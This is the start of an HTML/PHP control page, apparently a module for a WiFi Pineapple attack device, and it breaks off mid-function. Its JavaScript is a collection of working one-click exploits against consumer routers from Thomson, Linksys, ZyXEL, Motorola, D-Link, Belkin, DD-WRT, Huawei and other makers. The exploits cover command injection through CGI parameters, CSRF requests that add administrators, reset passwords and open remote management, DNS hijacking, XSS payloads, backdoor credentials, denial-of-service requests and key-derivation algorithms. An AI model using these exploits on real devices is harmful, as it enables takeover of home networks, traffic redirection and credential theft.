<html>
<head>
<title>Pineapple Control Center - <?php echo $module_name." [v".$module_version."]"; ?></title>
<script  type="text/javascript" src="/pineapple/includes/jquery.min.js"></script>
<script  type="text/javascript" src="js/jquery.idTabs.min.js"></script>

<style>
	a,a:visited,a:active,a:link {
		color:white;
		text-decoration:none;
	}

	a:hover {
		color:white;
		text-decoration:none;
		text-shadow:#FFF 2px 2px 20px;
	}

	article {
		padding: 0.3em;
		margin-left: auto;
		margin-right: auto;
		background: #222222;
		border: 2px solid;
		border-color: black;
		display:inline-block;
		width: 100%;
	}

	article:hover {
		background: #333333;
	}

	article div:nth-child(1){
		display:inline;
		float: left;
	}

	article div:nth-child(2){
		display:inline;
		float: left;
		padding-left: 2em;
	}

	article div:nth-child(3){
		display:inline;
		padding-left: 2em;
	}

	article div:nth-child(4){
		display:inline;
		float: right;
	}

	body {
		font-family: "Arial";
		background: #111111;
		background-image: url("bg.jpg");
		background-repeat: repeat-x;
		background-attachment: fixed;
	}

	#contenedor {
		display: block;
		background: #000;
		width: 70%;
		margin-left: auto;
		margin-right: auto;
		text-align: center;
		border-color: #FFF;
		border-width: 1px 1px 1px 1px;
		border-style: solid;
		color: #FFF;
	}

	#exploits {
		text-align: left;
		margin-left: auto;
		margin-right: auto;
	}

	footer {
		display: block;
		background: #000;
		margin-left: auto;
		margin-right: auto;
		text-align: center;
		border-color: #FFF;
		border-width: 1px 1px 1px 1px;
		border-style: solid;
		color: #FFF;
		width: 70%;
		padding: 2em;
	}

	footer img {
		padding: 1em;
	}

	h2 {
		font-size: 3em;
		padding: 0.5em;
		text-align: justify;
		display: inline;
	}


	#logo {
		background: url("logo.gif") no-repeat center, black;
		width: 300px;
		height: 300px;
		margin-left: auto;
		margin-right: auto;
	}

	section { 
		padding: 2em;
	}

	#market {
		z-index:2;
		float: right;
		text-align:right;
		display:block;
	}
	</style>

<script>

function img(query) {
	document.location="http://www.google.com/search?tbm=isch&q="+query;
}

function setip(url) {
	ip=prompt("IP:");
	document.location="http://"+ip+url;
}

function getxss() {
	r=confirm("Use %3Cscript%3Ealert%281%29%3C%2fscript%3E ?");
	if (r==true){
	  xss="%3Cscript%3Ealert%281%29%3C%2fscript%3E"
	  }
	else {
	  xss=prompt("Enter custom XSS injection:");
		}
	return xss;
}

function urlxss(url) {
	url = url.replace("URLXSS", getxss());
	document.location=url;
}

function huapppr(){
	ip=prompt("IP:");
	img1.src="http://"+ip+"/Listadeparametros.html";
	alert("Continue");
	document.location="http://"+ip+"/wanfun.js";
}

function huappp(){
	img1.src="http://192.168.1.254/Listadeparametros.html";
	alert("Continue");
	document.location="http://192.168.1.254/wanfun.js";
}

function wireAddHosts() {
	dominio=prompt("Redirect this host:");
	ip=prompt("to this IP:");
	document.location="http://home/xslt?PAGE=J38_SET&THISPAGE=J38&NEXTPAGE=J38_SET&NAME="+dominio+"&ADDR="+ip;
}

function wireAddHostsip() {
	routerip=prompt("Router IP:");
	dominio=prompt("Redirect this host:");
	ip=prompt("to this IP:");
	document.location="http://"+routerip+"/xslt?PAGE=J38_SET&THISPAGE=J38&NEXTPAGE=J38_SET&NAME="+dominio+"&ADDR="+ip;
}
function wirecrlfr() {
	ip=prompt("IP:");
	document.location="https://"+ip+":50001/xslt?PAGE=%0d%0a";
}
function wirecrlf() {
	ip=prompt("IP:");
	document.location="http://"+ip+"/xslt?PAGE=%0d%0a";
}

function ssDefaultPass() {
	ip=prompt("Remote IP:");
	document.location="http://telmex:telmex@"+ip;
}

function thomsondom() {
	dominio=prompt("Redirect this domain:");
	document.thomsondom.dom1.value=dominio;
	dominio2=prompt("to this domain:");
	document.thomsondom.dom2.value=dominio2;
	document.thomsondom.submit();
}
function thomsonadmin() {
	admin=prompt("Add administrator user(password):");
	document.thomsonadmin.elements[4].value=admin;
	document.thomsonadmin.action="http://192.168.1.254/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9";
	document.thomsonadmin.submit();
}

function thomsonadminr() {
	ip=prompt("IP");
	admin=prompt("Add administrator user(password):");
	document.thomsonadmin.elements[4].value=admin;
	document.thomsonadmin.action="http://"+ip+"/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9";
	document.thomsonadmin.submit();
}
function thomsoncall() {
	num=prompt("Call this phone number:");
	document.thomsoncall.elements[1].value=num;
	document.thomsoncall.submit();
}
function thomsondomr() {
	ip=prompt("IP:");
	dominio=prompt("Redirect this domain:");
	document.thomsondom.dom1.value=dominio;
	dominio2=prompt("to this domain:");
	document.thomsondom.dom2.value=dominio2;
	document.thomsondom.action="http://"+ip+"/cgi/b/sfltr/cfg/?be=0&l0=2&l1=5";
	document.thomsondom.submit();
}

function thomsoncallr() {
	ip=prompt("IP:");
	num=prompt("Call this phone number:");
	document.thomsoncall.elements[1].value=num;
	document.thomsoncall.action="http://"+ip+"/cgi/b/_voip_/stats//?ce=1&be=0&l0=-1&l1=-1&name=";
	document.thomsoncall.submit();
}
function btra() {
	pass=prompt("Change tech password to:");
	document.btra.elements[2].value=pass;
	document.btra.submit();
}
function btrar() {
	ip=prompt("IP:");
	pass=prompt("Change tech password to:");
	document.btra.elements[2].value=pass;
	document.btra.action="http://"+ip+"/cgi/b/ras//?ce=1&be=1&l0=5&l1=5";
	document.btra.submit();
}
function btwifir() {
	ip=prompt("IP:");
	document.btwifi.action="http://"+ip+"/cgi/b/_wli_/cfg//";
	document.btwifi.submit();
}
function mt880admin() {
	admin=prompt("Add administrator user(password):");
	document.location="http://admin:admin@192.168.1.1/Action?user_id="+admin+"&priv=1&pass1="+admin+"&pass2="+admin+"&id=70";
}
function mt880adminr() {
	ip=prompt("IP:");
	admin=prompt("Add administrator user(password):");
	document.location="http://admin:admin@"+ip+"/Action?user_id="+admin+"&priv=1&pass1="+admin+"&pass2="+admin+"&id=70";
}

function mt880fw() {
	ip=prompt("IP:");
	admin=prompt("Add administrator user(password):");
	document.location="http://admin:admin@"+ip+"/Action?blacklisting_status=1&bl_list=10&attack_status=0&dos_status=0&id=42&max_tcp=25&max_icmp=25&max_host=70";
}

function airoscmd() {
	cmd=prompt("Command:");
	document.location="http://192.168.1.1/stainfo.cgi?ifname=eth0;"+cmd;
}

function airoscmdr() {
	ip=prompt("IP:");
	cmd=prompt("Command:");
	document.location="http://"+ip+"/stainfo.cgi?ifname=eth0;"+cmd;
}


function comcommand() {
	ip=prompt("IP:");
	cmd=prompt("Command:");
	document.location="http://"+ip+"/utility.cgi?testType=1&IP=aaa || "+cmd;
}
function comcommandl() {
	ip="192.168.1.1";
	cmd=prompt("Command:");
	document.location="http://"+ip+"/utility.cgi?testType=1&IP=aaa || "+cmd;
}

function belkindns() {
	dns1=prompt("DNS IP (???.XXX.XXX.XXX):");
	dns2=prompt("DNS IP ("+dns1+".???.XXX.XXX):");
	dns3=prompt("DNS IP ("+dns1+"."+dns2+".???.XXX):");
	dns4=prompt("DNS IP ("+dns1+"."+dns2+"."+dns3+".???):");
	document.belkindns.dns1_1.value=dns1;
	document.belkindns.dns1_2.value=dns2;
	document.belkindns.dns1_3.value=dns3;
	document.belkindns.dns1_4.value=dns4;
	document.belkindns.dns2_1.value=dns1;
	document.belkindns.dns2_2.value=dns2;
	document.belkindns.dns2_3.value=dns3;
	document.belkindns.dns2_4.value=dns4;
	document.belkindns.submit();
}

function belkindnsr() {
	ip=prompt("IP:");
	dns1=prompt("DNS IP (???.XXX.XXX.XXX):");
	dns2=prompt("DNS IP ("+dns1+".???.XXX.XXX):");
	dns3=prompt("DNS IP ("+dns1+"."+dns2+".???.XXX):");
	dns4=prompt("DNS IP ("+dns1+"."+dns2+"."+dns3+".???):");
	document.belkindns.dns1_1.value=dns1;
	document.belkindns.dns1_2.value=dns2;
	document.belkindns.dns1_3.value=dns3;
	document.belkindns.dns1_4.value=dns4;
	document.belkindns.dns2_1.value=dns1;
	document.belkindns.dns2_2.value=dns2;
	document.belkindns.dns2_3.value=dns3;
	document.belkindns.dns2_4.value=dns4;
	document.belkindns.action="http://"+ip+"/cgi-bin/setup_dns.exe";
	document.belkindns.submit();
}

function belkinrest() {
	ip=prompt("IP:");
	document.belkinrest.action="http://"+ip+"/cgi-bin/setup_dns.exe";
	document.belkinrest.submit();
}

function wrtadmin() {
	admin=prompt("Change administrator password:");
	document.wrtadmin.http_passwd.value=admin;
	document.wrtadmin.http_passwdConfirm.value=admin;
	document.wrtadmin.submit();
}
function wrtadminr() {
	ip=prompt("IP:");
	document.wrtadmin.action="http://"+ip+"/manage.tri";
	admin=prompt("Change administrator password:");
	document.wrtadmin.http_passwd.value=admin;
	document.wrtadmin.http_passwdConfirm.value=admin;
	document.wrtadmin.submit();
}
function wag120pass() {
	admin=prompt("Change administrator password:");
	document.wag120pass.sysPasswd.value=admin;
	document.wag120pass.sysConfirmPasswd.value=admin;
	document.wag120pass.submit();
}
function wag120add() {
	user=prompt("Add administrator username:");
	document.wag120add.sysname.value=user;
	admin=prompt("Add administrator password:");
	document.wag120add.sysPasswd.value=admin;
	document.wag120add.sysConfirmPasswd.value=admin;
	document.wag120add.submit();
}
function wag120passr() {
	ip=prompt("IP:");
	document.wag120pass.action="http://"+ip+"/setup.cgi";
	admin=prompt("Change administrator password:");
	document.wag120pass.sysPasswd.value=admin;
	document.wag120pass.sysConfirmPasswd.value=admin;
	document.wag120pass.submit();
}
function wag120addr() {
	ip=prompt("IP:");
	document.wag120add.action="http://"+ip+"/setup.cgi";
	user=prompt("Add administrator username:");
	document.wag120add.sysname.value=user;
	admin=prompt("Add administrator password:");
	document.wag120add.sysPasswd.value=admin;
	document.wag120add.sysConfirmPasswd.value=admin;
	document.wag120add.submit();
}
function wrtradmin() { //fixed. thnx lightos
	admin=prompt("Set administrator password:");
	document.wrtadmin.http_passwd.value=admin;
	port=prompt("Remote interface on port:");
	document.wrtadmin.http_wanport.value=port;
	document.wrtadmin.remote_management.value="1";
	document.wrtadmin.submit();
}
function wrtradminr() {
	ip=prompt("IP:");
	document.wrtadmin.action="http://"+ip+"/manage.tri";
	admin=prompt("Set administrator password:");
	document.wrtadmin.http_passwd.value=admin;
	port=prompt("Remote interface on port:");
	document.wrtadmin.http_wanport.value=port;
	document.wrtadmin.remote_management.value="1";
	document.wrtadmin.submit();
}
function wrtdefault() {
	ip=prompt("IP:");
	document.wrtdefault.action="http://"+ip+"/factdefa.tri";
	document.wrtdefault.submit();
}
function wrtwifi() {
	ip=prompt("IP:");
	document.wrtwifi.action="http://"+ip+"/Security.tri";
	document.wrtwifi.submit();
}

function wbrpass() {
	admin=prompt("New password:");
	document.location="http://192.168.0.1/tools_admin.cgi?admname=admin&admPass1="+admin+"&admPass2="+admin+"&username=user&userPass1=WDB8WvbXdHtZyM8&userPass2=WDB8WvbXdHtZyM8&hip1=*&hport=8080&hEnable=1";
}

function dirpass() {
	admin=prompt("New password:");
	document.location="http://192.168.0.1/apply.cgi?admin_password="+admin+"&admin_password1="+admin+"&admPass2="+admin+"&remote_enable=1&remote_http_management_enable=1&remote_http_management_port=8080&remote_inbound_filter=Allow_All&remote_http_management_inbound_filter=Allow_All";
}

function dirpassr() {
	ip=prompt("IP:");
	admin=prompt("New password:");
	document.location="http://"+ip+"/apply.cgi?admin_password="+admin+"&admin_password1="+admin+"&admPass2="+admin+"&remote_enable=1&remote_http_management_enable=1&remote_http_management_port=8080&remote_inbound_filter=Allow_All&remote_http_management_inbound_filter=Allow_All";
}

function dsltpass() {
	alert("Reseting password admin:password");
	document.dsltpass.submit();
}

function dsltpassr() {
	ip=prompt("IP:");
	alert("Reseting password admin:password");
	document.dsltpass.action="http://"+ip+"/cgi-bin/webcm";
	document.dsltpass.submit();
}

function DSL2640B() {
	ip=prompt("IP:");
	pass=prompt("Password:");
	document.dsl2640.action="http://192.168.1.1:80/redpass.cgi?sysPassword="+pass+"&change=1";
	document.dsl2640.submit();
}

function DSL2640Br() {
	ip=prompt("IP:");
	pass=prompt("Password:");
	document.dsl2640.action="http://"+ip+":80/redpass.cgi?sysPassword="+pass+"&change=1";
	document.dsl2640.submit();
}

function singwiredosr() {
	ip=prompt("IP:");
	document.singwiredos.action="http://"+ip+"/xslt";
	document.singwiredos.submit();
}

function wbrpassr() {
	ip=prompt("IP:");
	admin=prompt("New password:");
	document.location="http://"+ip+"/tools_admin.cgi?admname=admin&admPass1="+admin+"&admPass2="+admin+"&username=user&userPass1=WDB8WvbXdHtZyM8&userPass2=WDB8WvbXdHtZyM8&hip1=*&hport=8080&hEnable=1";
}
function setipadminadmin() {
	ip=prompt("IP:");
	document.location="http://admin:admin@"+ip;
}
function zyxelxss() {
	dom=prompt("Domain:");
	document.zyxelxss.sysDomainname.value=dom;
	xss=getxss();
	document.zyxelxss.sysSystemname.value=xss;
	document.zyxelxss.submit();
}
function zyxelxssp() {
	xss=getxss();
	document.zyxelxssp.PortRule_Name.value=xss;
	document.zyxelxssp.submit();
}
function zyxelxsspr() {
	xss=getxss();
	document.zyxelxssp.PortRule_Name.value=xss;
	document.zyxelxssp.submit();
}
function zyxelxssr() {
	ip=prompt("IP:");
	dom=prompt("Domain:");
	document.zyxelxss.sysDomainname.value=dom;
	xss=getxss();
	document.zyxelxss.sysSystemname.value=xss;
	document.zyxelxss.action="http://"+ip+"/forms/General_1";
	document.zyxelxss.submit();
}
function zyxeldefault() {
	ip=prompt("IP:");
	document.location="http://user:1234@"+ip;
}
function shodan() {
	q=prompt("Search:");
	document.location="http://www.shodanhq.com/?q="+q;
}

function macfind() {
	q=prompt("AP MAC:");
	document.location="http://www.coffer.com/mac_find/?string="+q;
}

function isnaaa(){
	ip=prompt("Flexi-ISN IP:");
	document.location="http://"+ip+"/cgi-bin/aaa.tcl?";
}
function isnagr(){
	ip=prompt("Flexi-ISN IP:");
	document.location="http://"+ip+"/cgi-bin/aggr_config.tcl?";
}
function isnggs(){
	ip=prompt("Flexi-ISN IP:");
	document.location="http://"+ip+"/opt/cgi-bin/ggsn/cgi.tcl?page=ggsnconf";
}
function isnser(){
	ip=prompt("Flexi-ISN IP:");
	document.location="http://"+ip+"/opt/cgi-bin/services.tcl?instance=default";
}
function motfirr(){
	ip=prompt("IP:");
	img1.src="http://"+ip+"/frames.asp?userId=admin&password=motorola";
	alert("Continuar...");
	img2.src="http://"+ip+"/goformFOO/AlFrame?Firewall.Policy.firewallPolicy=4";
}
function motremr(){
	ip=prompt("IP:");
	img1.src='http://'+ip+'/frames.asp?userId=admin&password=motorola';
	alert("Continuar...");
	img2.src='http://'+ip+'/goformFOO/AlFrame?Gateway.AdvancedAdminSetting.remoteAccessEnable=1';
}
function motdnsr(){
	ip=prompt("IP:");
	img1.src='http://'+ip+'/frames.asp?userId=admin&password=motorola';
	dns=prompt("DNS:");
	img2.src='http://'+ip+'/goformFOO/AlFrame?Gateway.VirtualServerAdvConfig.add=Add&Gateway.VirtualServerAdvConfig.serverId.entry="%27%2B(window.onload%3Dfunction(){with(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dhcpClientEnabled=0%27%3Bz=%27%27%3Bfor(c in {%27Gateway.Wan.ipAddress%27:0,%27Gateway.Wan.subnetMask%27:0,%27Gateway.Wan.defaultGateway%27:0})z%2B=c%2B%27=%27%2Bdocument.getElementById(c).value%2B%27%26%27%3Bwith(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dnsAddress1='+dns+'%26%27%2Bz%2B%27%26Gateway.Wan.dhcpClientEnabled=0%27})%2B%27';
}
function motpasr(){
	ipp=prompt("IP:");
	ip=prompt("New password:");
	img1.src="http://"+ipp+"/goformFOO/AlFrame?Gateway.BasicAdminSetting.newPassword="+ip+"&Gateway.BasicAdminSetting.verifyPassword="+ip+"&Gateway.BasicAdminSetting.set=1";
	alert("Continuar...");
	img2.src="http://"+ipp+"/goformFOO/AlFrame?Gateway.BasicAdminSetting.userId=admin&Gateway.BasicAdminSetting.oldPassword="+ip+"&Gateway.BasicAdminSetting.newPassword="+ip+"&Gateway.BasicAdminSetting.verifyPassword="+ip+"&Gateway.BasicAdminSetting.set=1";
}
function motfir(){
	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
	alert("Continue...");
	img2.src='http://192.168.0.1/goformFOO/AlFrame?Firewall.Policy.firewallPolicy=4';
}
function motrem(){
	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
	alert("Continue...");
	img2.src='http://192.168.0.1/goformFOO/AlFrame?Gateway.AdvancedAdminSetting.remoteAccessEnable=1';
}
function motdns(){
	img1.src='http://192.168.0.1/frames.asp?userId=admin&password=motorola';
	ip=prompt("DNS:");
	img2.src='http://192.168.0.1/goformFOO/AlFrame?Gateway.VirtualServerAdvConfig.add=Add&Gateway.VirtualServerAdvConfig.serverId.entry="%27%2B(window.onload%3Dfunction(){with(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dhcpClientEnabled=0%27%3Bz=%27%27%3Bfor(c in {%27Gateway.Wan.ipAddress%27:0,%27Gateway.Wan.subnetMask%27:0,%27Gateway.Wan.defaultGateway%27:0})z%2B=c%2B%27=%27%2Bdocument.getElementById(c).value%2B%27%26%27%3Bwith(document)body.appendChild(createElement(%27img%27)).src=%27/goformFOO/AlFrame?Gateway.Wan.dnsAddress1='+ip+'%26%27%2Bz%2B%27%26Gateway.Wan.dhcpClientEnabled=0%27})%2B%27';
}
function motpas(){
	ip=prompt("New password:");
	img1.src="http://192.168.0.1/goformFOO/AlFrame?Gateway.BasicAdminSetting.newPassword="+ip+"&Gateway.BasicAdminSetting.verifyPassword="+ip+"&Gateway.BasicAdminSetting.set=1";
	alert("Continue...");
	img2.src="http://192.168.0.1/goformFOO/AlFrame?Gateway.BasicAdminSetting.userId=admin&Gateway.BasicAdminSetting.oldPassword="+ip+"&Gateway.BasicAdminSetting.newPassword="+ip+"&Gateway.BasicAdminSetting.verifyPassword="+ip+"&Gateway.BasicAdminSetting.set=1";
}
function acctongen(){
//# Accton Mercury "__super" user proof of concept
//# Disassembling and first PoC - smite@zylon.net.
//# Disassembling and math - psy@datux.nl, gido@datux.nl
//# Ported to Javascript - hkm@hakim.ws
  var counter;
  var pass="";
  q=prompt("MAC:");
  var mac = q.split(':');

  for (counter=0;counter<6;counter++) {
	mac[counter]=parseInt(mac[counter],16);
  }

  function printchar() {
	char = char % 0x4b;	
	if (char <= 9 || (char > 0x10 && char < 0x2a) || char > 0x30) {
		pass=pass+String.fromCharCode(char+0x30);
	} else {
		pass=pass+"!";
	}
  }

  for (counter=0;counter<5;counter++) {
    char = mac[counter];
    char = char + mac[counter+1];
    printchar(char);
  }

  for (counter=0;counter<3;counter++) {
    char = mac[counter];
    char = char + mac[counter+1];
    char = char +  0xF;
    printchar(char);
  }
  alert("PASSWORD: "+pass);
}
function mac2wepkey(){
/* mac2wepkey Huawei HG520 by humberto121@websec.mx - 12/2010 */
/* .js by hkm */
q=prompt("MAC:");
q = q.replace(/:/g,'');

mac = new Array();
for (c=0;c<12;c++) {
   mac[c]=parseInt(q[c], 16);
}

a0=new Array(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);
a1=new Array(0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15);
a2=new Array(0,13,10,7,5,8,15,2,10,7,0,13,15,2,5,8);
a3=new Array(0,1,3,2,7,6,4,5,15,14,12,13,8,9,11,10);
a4=new Array(0,5,11,14,7,2,12,9,15,10,4,1,8,13,3,6);
a5=new Array(0,4,8,12,0,4,8,12,0,4,8,12,0,4,8,12);
a6=new Array(0,1,3,2,6,7,5,4,12,13,15,14,10,11,9,8);
a7=new Array(0,8,0,8,1,9,1,9,2,10,2,10,3,11,3,11);
a8=new Array(0,5,11,14,6,3,13,8,12,9,7,2,10,15,1,4);
a9=new Array(0,9,2,11,5,12,7,14,10,3,8,1,15,6,13,4);
a10=new Array(0,14,13,3,11,5,6,8,6,8,11,5,13,3,0,1,4);
a11=new Array(0,12,8,4,1,13,9,5,2,14,10,6,3,15,11,7);
a12=new Array(0,4,9,13,2,6,11,15,4,0,13,9,6,2,15,11);
a13=new Array(0,8,1,9,3,11,2,10,6,14,7,15,5,13,4,12);
a14=new Array(0,1,3,2,7,6,4,5,14,15,13,12,9,8,10,11);
a15=new Array(0,1,3,2,6,7,5,4,13,12,14,15,11,10,8,9);
n1=new Array(0,14,10,4,8,6,2,12,0,14,10,4,8,6,2,12);
n2=new Array(0,8,0,8,3,11,3,11,6,14,6,14,5,13,5,13);
n3=new Array(0,0,3,3,2,2,1,1,4,4,7,7,6,6,5,5);
n4=new Array(0,11,12,7,15,4,3,8,14,5,2,9,1,10,13,6);
n5=new Array(0,5,1,4,6,3,7,2,12,9,13,8,10,15,11,14);
n6=new Array(0,14,4,10,11,5,15,1,6,8,2,12,13,3,9,7);
n7=new Array(0,9,0,9,5,12,5,12,10,3,10,3,15,6,15,6);
n8=new Array(0,5,11,14,2,7,9,12,12,9,7,2,14,11,5,0);
n9=new Array(0,0,0,0,4,4,4,4,0,0,0,0,4,4,4,4);
n10=new Array(0,8,1,9,3,11,2,10,5,13,4,12,6,14,7,15);
n11=new Array(0,14,13,3,9,7,4,10,6,8,11,5,15,1,2,12);
n12=new Array(0,13,10,7,4,9,14,3,10,7,0,13,14,3,4,9);
n13=new Array(0,1,3,2,6,7,5,4,15,14,12,13,9,8,10,11);
n14=new Array(0,1,3,2,4,5,7,6,12,13,15,14,8,9,11,10);
n15=new Array(0,6,12,10,9,15,5,3,2,4,14,8,11,13,7,1);
n16=new Array(0,11,6,13,13,6,11,0,11,0,13,6,6,13,0,11);
n17=new Array(0,12,8,4,1,13,9,5,3,15,11,7,2,14,10,6);
n18=new Array(0,12,9,5,2,14,11,7,5,9,12,0,7,11,14,2);
n19=new Array(0,6,13,11,10,12,7,1,5,3,8,14,15,9,2,4);
n20=new Array(0,9,3,10,7,14,4,13,14,7,13,4,9,0,10,3);
n21=new Array(0,4,8,12,1,5,9,13,2,6,10,14,3,7,11,15);
n22=new Array(0,1,2,3,5,4,7,6,11,10,9,8,14,15,12,13);
n23=new Array(0,7,15,8,14,9,1,6,12,11,3,4,2,5,13,10);
n24=new Array(0,5,10,15,4,1,14,11,8,13,2,7,12,9,6,3);
n25=new Array(0,11,6,13,13,6,11,0,10,1,12,7,7,12,1,10);
n26=new Array(0,13,10,7,4,9,14,3,8,5,2,15,12,1,6,11);
n27=new Array(0,4,9,13,2,6,11,15,5,1,12,8,7,3,14,10);
n28=new Array(0,14,12,2,8,6,4,10,0,14,12,2,8,6,4,10);
n29=new Array(0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3);
n30=new Array(0,15,14,1,12,3,2,13,8,7,6,9,4,11,10,5);
n31=new Array(0,10,4,14,9,3,13,7,2,8,6,12,11,1,15,5);
n32=new Array(0,10,5,15,11,1,14,4,6,12,3,9,13,7,8,2);
n33=new Array(0,4,9,13,3,7,10,14,7,3,14,10,4,0,13,9);
key=new Array(30,31,32,33,34,35,36,37,38,39,61,62,63,64,65,66);
ssid=new Array(0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f');

s1=(n1[mac[0]])^(a4[mac[1]])^(a6[mac[2]])^(a1[mac[3]])^(a11[mac[4]])^(n20[mac[5]])^(a10[mac[6]])^(a4[mac[7]])^(a8[mac[8]])^(a2[mac[9]])^(a5[mac[10]])^(a9[mac[11]])^5;
s2=(n2[mac[0]])^(n8[mac[1]])^(n15[mac[2]])^(n17[mac[3]])^(a12[mac[4]])^(n21[mac[5]])^(n24[mac[6]])^(a9[mac[7]])^(n27[mac[8]])^(n29[mac[9]])^(a11[mac[10]])^(n32[mac[11]])^10;
s3=(n3[mac[0]])^(n9[mac[1]])^(a5[mac[2]])^(a9[mac[3]])^(n19[mac[4]])^(n22[mac[5]])^(a12[mac[6]])^(n25[mac[7]])^(a11[mac[8]])^(a13[mac[9]])^(n30[mac[10]])^(n33[mac[11]])^11;
s4=(n4[mac[0]])^(n10[mac[1]])^(n16[mac[2]])^(n18[mac[3]])^(a13[mac[4]])^(n23[mac[5]])^(a1[mac[6]])^(n26[mac[7]])^(n28[mac[8]])^(a3[mac[9]])^(a6[mac[10]])^(a0[mac[11]])^10;
ya=(a2[mac[0]])^(n11[mac[1]])^(a7[mac[2]])^(a8[mac[3]])^(a14[mac[4]])^(a5[mac[5]])^(a5[mac[6]])^(a2[mac[7]])^(a0[mac[8]])^(a1[mac[9]])^(a15[mac[10]])^(a0[mac[11]])^13;
yb=(n5[mac[0]])^(n12[mac[1]])^(a5[mac[2]])^(a7[mac[3]])^(a2[mac[4]])^(a14[mac[5]])^(a1[mac[6]])^(a5[mac[7]])^(a0[mac[8]])^(a0[mac[9]])^(n31[mac[10]])^(a15[mac[11]])^4;
yc=(a3[mac[0]])^(a5[mac[1]])^(a2[mac[2]])^(a10[mac[3]])^(a7[mac[4]])^(a8[mac[5]])^(a14[mac[6]])^(a5[mac[7]])^(a5[mac[8]])^(a2[mac[9]])^(a0[mac[10]])^(a1[mac[11]])^7;
yd=(n6[mac[0]])^(n13[mac[1]])^(a8[mac[2]])^(a2[mac[3]])^(a5[mac[4]])^(a7[mac[5]])^(a2[mac[6]])^(a14[mac[7]])^(a1[mac[8]])^(a5[mac[9]])^(a0[mac[10]])^(a0[mac[11]])^14;
ye=(n7[mac[0]])^(n14[mac[1]])^(a3[mac[2]])^(a5[mac[3]])^(a2[mac[4]])^(a10[mac[5]])^(a7[mac[6]])^(a8[mac[7]])^(a14[mac[8]])^(a5[mac[9]])^(a5[mac[10]])^(a2[mac[11]])^7;

alert("          WEP = "+key[ya]+key[yb]+key[yc]+key[yd]+key[ye]+"\n          SSID = "+ssid[s1]+ssid[s2]+ssid[s3]+ssid[s4]);
}
String.prototype.toHex = function() {
    return this.replace("com", function(s) {
        return "%"+parseInt(s.charCodeAt()).toString(16);
    });
};
function netdos() {
	ip=prompt("IP:");
	document.netdos.action="http://"+ip+"/cgi-bin/firmwarecfg";
	document.netdos.submit();
}
function netbyp(){
	ip=prompt("IP:");
	img1.src="http://"+ip+"/recreate.php";
	alert("Continue...");
	document.location="http://"+ip+"/index.php";
}

function netund() {
	ip=prompt("IP:");
	document.location="http://super:5777364@"+ip;
}
function netundb() {
	ip=prompt("IP:");
	document.location="http://superman:21241036@"+ip;
}
function netcon() {
	url=prompt("Full URL (without http):");
	dominio=url.substr(0,url.indexOf("/"));
	path=url.substr(url.indexOf("/"), url.lenght);
	document.location="http://"+dominio+path.toHex();
}
function netconb() {
	ip=prompt("IP:");
	port=prompt("Port:");
	document.location="http://"+ip+"/vgn/jsp/netgear.cfg"+port;
}
function netlog() {
	url=prompt("Blocked URL:");
	code=prompt("Inject code:");
	document.location="http://"+url+"</textarea>"+code;
}
/* pdp exploit */
function readConfig() {
	login();
	setTimeout(function() {
		xss('"><iframe src="http://192.168.1.1/cgi-bin/webcm?getpage=/etc/config.xml" onload="alert(this.contentWindow.document.body.innerHTML);">');
	}, 2000);
}
function xss(payload) { /* grax por el fix Alvaro Soto*/
	ifrm = document.getElementById('iframe');
	ifrm.contentWindow.location = 'http://192.168.1.1/cgi-bin/web.....9;'+payload;
}
function login() {
	var f = document.createElement('form');
	f.action = 'http://192.168.1.1/cgi-bin/webcm';
	f.innerHTML = '<input type="hidden" name="getpage" value="../html/home.htm"><input type="hidden" name="errorpage" value="../html/index.html">';
	f.innerHTML += '<input type="hidden" name="login:command/username" value="admin"><input type="hidden" name="login:command/password" value="admin">';
	f.innerHTML += '<input type="hidden" name="var:errormsg" value="Error">';
	f.target = 'iframe';
	f.method = 'post';
	document.body.appendChild(f);
	f.submit();
}
function post(url, fields) {
	var p = document.createElement('form');
	p.action = url;
	p.innerHTML = fields;
	p.target = 'iframe';
	p.method = 'post';
	document.body.appendChild(p);
	p.submit();
}
function changeDNS(server) {
	login();
	setTimeout(function() {
		var fields = '<input type="hidden" name="getpage" value="../html/setup/dns.htm">';
		fields += '<input type="hidden" name="resolver:settings/nameserver1" value="'+server+'">';
		fields += '<input type="hidden" name="resolver:settings/nameserver2" value="'+server+'">';
		fields += '<input type="hidden" name="dproxy:settings/state" value="2">';
		post('http://192.168.1.1/cgi-bin/webcm',fields);
	}, 2000);
	setTimeout(function() {
		post('http://192.168.1.1/cgi-bin/web.....;<input type="hidden" name="logic:command/save" value="../html/tools/syscommnd.htm">');
	},5000);
}
/* end pdp */
function dlidns() {
	dns=prompt("DNS server:");
	changeDNS(dns);
}

function ddwrtexec() {
	cmd=prompt("Command:");
	document.location="http://192.168.1.1/cgi-bin/;"+cmd;
}

function dns320() {
	cmd=prompt("Command:");
	document.location=" http://192.168.0.1/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1="+cmd;
}

function dns320r() {
	ip=prompt("IP:");
	cmd=prompt("Command:");
	document.location=" http://"+ip+"/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1="+cmd;
}


function ddwrtexecr() {
	ip=prompt("IP:");
	cmd=prompt("Command:");
	document.location="http://"+ip+"/cgi-bin/;"+cmd;
}

function huados() {
	ip=prompt("IP:");
	document.location="http://SHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAA:SHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKASHAKA@"+ip;
}
function asmrce() {
	ip=prompt("IP:");
	cmd=prompt("Command:");
	document.location="http://"+ip+"/cgi-bin/script?system%20"+cmd;
}
function asmfile() {
	ip=prompt("IP:");
	cmd=prompt("File:");
